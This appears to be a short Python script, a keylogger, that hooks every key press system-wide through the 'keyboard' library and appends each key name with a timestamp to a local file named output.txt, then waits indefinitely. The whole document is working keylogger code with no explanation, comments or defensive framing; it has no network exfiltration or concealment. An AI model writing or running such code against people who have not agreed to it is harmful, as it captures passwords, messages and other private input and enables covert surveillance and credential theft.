
import keyboard
from datetime import datetime


def KeyLog(event):
    
   
    if event.event_type == "down":
     pressed_key = event.name
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     datei = open("output.txt", "a")
     datei.write(timestamp + "-" + pressed_key +"\r\n" )
     datei.close()

keyboard.hook(KeyLog)
keyboard.wait()